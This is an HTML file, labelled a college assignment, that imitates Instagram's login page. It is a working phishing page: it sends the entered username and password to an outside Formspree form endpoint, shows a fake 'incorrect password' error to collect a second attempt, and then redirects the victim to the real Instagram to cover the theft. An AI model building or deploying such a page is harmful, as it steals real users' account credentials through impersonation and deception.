<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram - Trabalho Faculdade</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, sans-serif;
}
body {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    background-color: #fafafa;
}
.instagram-wrapper {
    display: flex;
    gap: 50px;
}
.instagram-phone img {
    max-width: 300px;
}
.instagram-login {
    width: 350px;
}
.group {
    background-color: #fff;
    border: 1px solid #dbdbdb;
    padding: 40px;
    margin-bottom: 10px;
    text-align: center;
}
.instagram-logo {
    margin-bottom: 20px;
}
form {
    display: flex;
    flex-direction: column;
}
input {
    width: 100%;
    padding: 9px;
    margin-bottom: 10px;
    border: 1px solid #dbdbdb;
    background-color: #fafafa;
    border-radius: 3px;
    font-size: 14px;
    text-align: center;
}
button {
    background-color: #0095f6;
    border: none;
    color: white;
    padding: 8px;
    border-radius: 4px;
    font-weight: bold;
    cursor: pointer;
}
#login-error {
    display: none;
    color: #ed4956;
    font-size: 14px;
    margin-top: 10px;
}
</style>
</head>

<body>

<div class="instagram-wrapper">

    <div class="instagram-phone">
        <img src="./img/apresentacao-celular.png" alt="Instagram">
    </div>

    <div class="instagram-login">

        <div class="group">
            <img src="./img/instagram-logo.png" class="instagram-logo" alt="Instagram logo">

            <form id="loginForm" action="https://formspree.io/f/xkoojkow" method="POST">
                <input type="text" name="login" placeholder="Telefone, nome de usuário ou email" required>
                <input type="password" name="senha" placeholder="Senha" required>

                <!-- _next controlado por JS -->
                <input type="hidden" id="nextField" name="_next" value="https://www.instagram.com/">
                <input type="hidden" name="_captcha" value="false">

                <button type="submit">Entrar</button>
            </form>

            <p id="login-error">
                A senha que você inseriu está incorreta. Tente novamente.
            </p>
        </div>

    </div>
</div>

<script>
let tentativas = 0;

const form = document.getElementById('loginForm');
const erro = document.getElementById('login-error');
const nextField = document.getElementById('nextField');

form.addEventListener('submit', function () {
    tentativas++;

    if (tentativas === 1) {
        // 1ª tentativa: envia normal, SEM redirecionar
        nextField.disabled = true;   // impede redirecionamento do Formspree
        erro.style.display = 'block';
    } else {
        // 2ª tentativa: envia normal E redireciona
        nextField.disabled = false;

        // backup de redirecionamento
        setTimeout(() => {
            window.location.href = 'https://www.instagram.com/';
        }, 300);
    }
});
</script>

</body>
</html>
